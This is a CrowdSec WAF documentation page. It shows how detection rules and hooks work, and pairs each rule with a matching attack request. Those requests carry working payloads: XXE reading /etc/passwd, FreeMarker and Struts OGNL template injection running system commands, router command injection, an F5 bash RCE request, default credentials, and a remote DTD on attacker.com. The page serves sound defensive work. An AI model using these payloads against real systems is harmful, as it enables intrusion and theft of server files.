---
id: rules_examples
title: Examples
sidebar_position: 81
---

# WAF Rules Examples

This page showcases various WAF rule capabilities with real-world examples from the CrowdSec Hub. Each example includes the rule definition, a matching HTTP request from the test suite, and explanations of the key features demonstrated.

## 1. Header Analysis - Missing User Agent Detection

### Description
Header inspection with count transform. Note that empty user agent-agent field or absent user-agent field is equivalent.

### Rule Example
```yaml
rules:
  - and:
      - zones:
        - METHOD
        match:
          type: regex
          value: '^GET|POST|PUT|DELETE|PATCH$'
      - zones:
        - HEADERS
        variables:
         - "User-Agent"
        transform:
          - count
        match:
          type: equals
          value: "0"
```

### HTTP Request Example
```http
GET / HTTP/1.1
Host: example.com
User-Agent:
```

### Key Features Demonstrated
- **Header inspection** using HEADERS zone
- **Transform operations** with count() to check header existence
- **HTTP method filtering** with regex patterns
- **AND logic** combining multiple conditions


## 2. Request Body Analysis - JSON Path Extraction

### Description
JSON path extraction with dot notation.

### Rule Example
```yaml
rules:
  - and:
    - zones:
      - METHOD
      transform:
      - uppercase
      match:
        type: equals
        value: POST
    - zones:
      - URI
      transform:
      - lowercase
      match:
        type: contains
        value: /rest/v1/guest-carts/1/estimate-shipping-methods
    - zones:
      - BODY_ARGS
      variables:
      - json.address.totalsCollector.collectorList.totalCollector.sourceData.data
      transform:
        - lowercase
      match:
        type: contains
        value: "<!entity"
```

### HTTP Request Example
```http
POST /rest/v1/guest-carts/1/estimate-shipping-methods HTTP/1.1
Host: example.com
Content-Type: application/json

{
  "address": {
    "totalsCollector": {
      "collectorList": {
        "totalCollector": {
          "sourceData": {
            "data": "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
            "dataIsURL": "true"
          }
        }
      }
    }
  }
}
```

### Key Features Demonstrated
- **Deep JSON path navigation** using dot notation
- **Request body parsing** with BODY_ARGS zone
- **Multiple transform operations** (uppercase, lowercase)
- **Complex AND conditions** across different zones

## 3. Query Parameter Inspection - SSTI Detection

### Description
Multi-zone pattern matching (ARGS and RAW_BODY).

### Rule Example
```yaml
rules:
  - and:
    - zones:
      - RAW_BODY
      - ARGS
      transform:
      - lowercase
      match:
        type: contains
        value: 'freemarker.template.utility.execute'
```

### HTTP Request Example
```http
GET /catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%63%61%74%20%2f%65%74%63%2f%68%6f%73%74%73%22%29%7d HTTP/1.1
Host: example.com
```

### Key Features Demonstrated
- **URL parameter parsing** with ARGS zone
- **Multiple zone matching** (RAW_BODY and ARGS)
- **String transformation** with lowercase normalization
- **Pattern-based detection** using contains match

## 4. File Upload Detection - WordPress PHP Execution

### Description
URI regex matching with multiple transforms.

### Rule Example
```yaml
rules:
  - and:
    - zones:
      - URI
      transform:
      - lowercase
      - urldecode
      match:
        type: regex
        value: '/wp-content/uploads/.*\.(h?ph(p|tm?l?|ar)|module|shtml)'
```

### HTTP Request Example
```http
GET /wp-content/uploads/2024/10/test.php?exec=id HTTP/1.1
Host: example.com
```

### Key Features Demonstrated
- **URI path analysis** with regex pattern matching
- **Multiple transforms** (lowercase and URL decoding)
- **Complex regex patterns** for file extension detection
- **WordPress-specific protection** against upload directory exploitation

## 5. HTTP Protocol Analysis - Form Data Validation

### Description
Form data analysis with variable targeting.

### Rule Example
```yaml
rules:
  - and:
    - zones:
      - METHOD
      transform:
      - lowercase
      match:
        type: equals
        value: post
    - zones:
      - URI
      transform:
      - lowercase
      match:
        type: endsWith
        value: /boaform/admin/formlogin
    - zones:
      - BODY_ARGS
      variables:
       - username
      transform:
      - lowercase
      match:
        type: equals
        value: "admin"
    - zones:
      - BODY_ARGS
      variables:
       - psd
      transform:
      - lowercase
      match:
        type: equals
        value: "parks"
```

### HTTP Request Example
```http
POST /boaform/admin/formLogin HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&psd=parks
```

### Key Features Demonstrated
- **Form data analysis** with BODY_ARGS and specific variable targeting
- **HTTP method validation** with case-insensitive matching
- **URI endpoint matching** using endsWith comparison
- **Credential pattern detection** for default login attempts

## 6. Header Names Analysis

### Description
Header name inspection (HEADERS_NAMES zone).

### Rule Example
```yaml
rules:
  - and:
      - zones:
          - URI
        transform:
          - lowercase
        match:
          type: contains
          value: /mgmt/tm/util/bash
      - zones:
          - HEADERS_NAMES
        transform:
          - lowercase
        match:
          type: contains
          value: x-f5-auth-token
      - zones:
          - HEADERS_NAMES
        transform:
          - lowercase
        match:
          type: contains
          value: authorization
```

### HTTP Request Example
```http
POST /mgmt/tm/util/bash HTTP/1.1
Host: example.com
Connection: keep-alive, X-F5-Auth-Token
X-F5-Auth-Token: a
Authorization: Basic YWRtaW46
Content-Type: application/json

{
     "command": "run",
     "utilCmdArgs": "-c 'id'"
}
```

### Key Features Demonstrated
- **Header name inspection** using HEADERS_NAMES zone
- **Multiple header validation** combining different authentication headers
- **Case-insensitive header matching** with lowercase transform
- **API endpoint protection** for management interfaces

## 7. Simple URI Pattern Matching - Environment File Access

### Description
Simple URI pattern matching with endsWith.

### Rule Example
```yaml
rules:
  - zones:
    - URI
    transform:
    - lowercase
    match:
      type: endsWith
      value: .env
```

### HTTP Request Example
```http
GET /foo/bar/.env HTTP/1.1
Host: example.com
```

### Key Features Demonstrated
- **Simple URI matching** without complex AND conditions
- **File extension detection** using endsWith matcher
- **Case normalization** with lowercase transform
- **Environment file protection** for configuration security

## 8. Regular Expression Validation - Command Injection Detection

### Description
Regex pattern matching for input validation.

### Rule Example
```yaml
rules:
  - and:
    - zones:
      - METHOD
      match:
        type: equals
        value: POST
    - zones:
      - URI
      transform:
      - lowercase
      match:
        type: endsWith
        value: /boaform/admin/formping
    - zones:
      - BODY_ARGS
      variables:
      - target_addr
      transform:
      - lowercase
      match:
        type: regex
        value: "[^a-f0-9:.]+"
```

### HTTP Request Example
```http
POST /boaform/admin/formPing HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

target_addr=1.2.3.4;cat /etc/passwd
```

### Key Features Demonstrated
- **Regex pattern matching** for command injection detection
- **Character class validation** to identify suspicious input
- **Form parameter filtering** on specific variables
- **Command injection prevention** through pattern recognition

## 9. Complex JSON Processing - Multi-condition XXE

### Description
Multi-property JSON validation.

### Rule Example
```yaml
rules:
  - and:
    - zones:
      - METHOD
      transform:
      - lowercase
      match:
        type: equals
        value: post
    - zones:
      - URI
      transform:
      - lowercase
      match:
        type: contains
        value: /rest/v1/guest-carts/1/estimate-shipping-methods
    - zones:
      - BODY_ARGS
      variables:
      - json.address.totalsCollector.collectorList.totalCollector.sourceData.data
      transform:
        - lowercase
      match:
        type: contains
        value: "://"
    - zones:
      - BODY_ARGS
      variables:
      - json.address.totalsCollector.collectorList.totalCollector.sourceData.dataIsURL
      transform:
        - lowercase
      match:
        type: equals
        value: "true"
```

### HTTP Request Example
```http
POST /rest/v1/guest-carts/1/estimate-shipping-methods HTTP/1.1
Host: example.com
Content-Type: application/json

{
  "address": {
    "totalsCollector": {
      "collectorList": {
        "totalCollector": {
          "sourceData": {
            "data": "http://attacker.com/malicious.dtd",
            "dataIsURL": "true"
          }
        }
      }
    }
  }
}
```

### Key Features Demonstrated
- **Multi-property JSON validation** checking both data content and flags
- **URL scheme detection** using contains match for "://"
- **Boolean flag inspection** in JSON structures
- **Complex attack vector prevention** through comprehensive validation

## 10. Template Injection in Request Body - POST Data Analysis

### Description
Raw body content analysis with multi-zone matching.

### Rule Example
```yaml
rules:
  - and:
    - zones:
      - RAW_BODY
      - ARGS
      transform:
      - lowercase
      match:
        type: contains
        value: 'freemarker.template.utility.execute'
```

### HTTP Request Example
```http
POST /template/aui/text-inline.vm HTTP/1.1
Host: example.com
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded

label=aaa\u0027%2b#request.get(\u0027.KEY_velocity.struts2.context\u0027).internalGet(\u0027ognl\u0027).findValue(#parameters.poc[0],{})%2b\u0027&poc=@org.apache.struts2.ServletActionContext@getResponse().setHeader(\u0027x_vuln_check\u0027,(new+freemarker.template.utility.Execute()).exec({"whoami"}))
```

### Key Features Demonstrated
- **POST body content analysis** using RAW_BODY zone
- **Template injection detection** through signature-based matching
- **URL-encoded payload handling** in form submissions
- **Multi-zone coverage** examining both args and raw body content

# Hooks Examples

Hooks allow you to customize WAF behavior at different execution phases. This section demonstrates key hook capabilities organized by execution phase.

## Pre-Evaluation Phase (pre_eval)

Pre-evaluation hooks run before rules are evaluated, allowing you to modify rule behavior dynamically per request.

### 1. Disable Rules by Name

#### Description
Dynamically disable specific rules before evaluation.

#### Hook Example
```yaml
pre_eval:
  - filter: req.URL.Path == "/admin/upload"
    apply:
      - RemoveInBandRuleByName('some-specific-rule')
```

#### Use Case
Disable existing rules on specific endpoints.

### 2. Disable Rules by Tag

#### Description
Disable multiple rules sharing the same tag.

#### Hook Example
```yaml
pre_eval:
  - apply:
      - RemoveInBandRuleByTag('wordpress-protection')
```

#### Use Case
Disable all WordPress-specific rules when not running WordPress.

### 3. Change Rule Remediation by Name

#### Description
Modify the default remediation for specific rules.

#### Hook Example
```yaml
pre_eval:
  - apply:
      - SetRemediationByName('sql-injection-detector', 'log')
```

#### Use Case
Change a blocking rule to log-only mode for testing.

## Post-Evaluation Phase (post_eval)

Post-evaluation hooks run after rule evaluation is complete, primarily used for debugging and logging.

### 4. Debug Request Dumping

#### Description
Dump request details to file for debugging.

#### Hook Example
```yaml
post_eval:
  - filter: IsInBand == true
    apply:
      - DumpRequest().WithBody().ToJSON()
```

#### Use Case
Capture full request details for forensic analysis or debugging rule behavior.

## On-Match Phase (on_match)

On-match hooks run when a rule matches, allowing you to modify the response behavior.

### 5. Change HTTP Response Code

#### Description
Modify the HTTP status code returned to users when a rule matches.

#### Hook Example
```yaml
on_match:
  - filter: IsInBand == true
    apply:
      - SetReturnCode(413)
```

#### Use Case
Return a 413 "Payload Too Large" instead of the default 403 when a rule triggers.

### 6. Change Remediation Action

#### Description
Dynamically change the remediation action from the default.

#### Hook Example
```yaml
on_match:
  - filter: IsInBand == true
    apply:
      - SetRemediation('captcha')
```

#### Use Case
Show a captcha instead of blocking the request for certain rule matches.

### 7. Allow Specific IPs

#### Description
Override blocking for trusted IP addresses.

#### Hook Example
```yaml
on_match:
  - filter: IsInBand == true && req.RemoteAddr == "192.168.1.100"
    apply:
      - SetRemediation('allow')
```

#### Use Case
Allow internal/admin IPs to bypass security rules while keeping protection for others.

### 8. Cancel Alert Generation

#### Description
Prevent alert creation while keeping the request blocked.

#### Hook Example
```yaml
on_match:
  - filter: IsInBand == true
    apply:
      - CancelAlert()
```

#### Use Case
Block suspicious requests without generating alerts for known false positives.

### 9. Force Alert for Out-of-Band Rules

#### Description
Generate alerts for monitoring rules that normally only log.

#### Hook Example
```yaml
on_match:
  - filter: IsOutBand == true
    apply:
      - SendAlert()
```

#### Use Case
Create alerts for reconnaissance attempts detected by monitoring rules.

### 10. Hook Flow Control

#### Description
Control execution of subsequent hooks with break/continue.

#### Hook Example
```yaml
on_match:
  - filter: IsInBand == true
    apply:
      - CancelEvent()
    on_success: break
  - filter: IsInBand == true
    apply:
      - SetRemediation('captcha')
```

#### Use Case
Cancel event generation and stop processing further hooks.

## Hook Execution Phases Summary

- **on_load**: Rule loading phase - disable/modify rules permanently
- **pre_eval**: Before rule evaluation - dynamic rule modification per request
- **on_match**: After rule match - modify response behavior
- **post_eval**: After evaluation - debugging and logging

## Summary of WAF Capabilities

These examples demonstrate the comprehensive capabilities of the CrowdSec WAF engine:

- **Zone-based analysis**: Headers, URI, Body, Args, Method inspection
- **Transform operations**: Case normalization, URL decoding, counting
- **Match types**: Exact equals, contains, regex, endsWith patterns
- **JSON processing**: Deep object navigation with dot notation
- **Complex logic**: AND/OR conditions across multiple zones
- **Variable targeting**: Specific parameter and header name filtering
- **Dynamic behavior**: Hooks for runtime customization
- **Security coverage**: XSS, SQLi, SSTI, XXE, RCE, and configuration exposure protection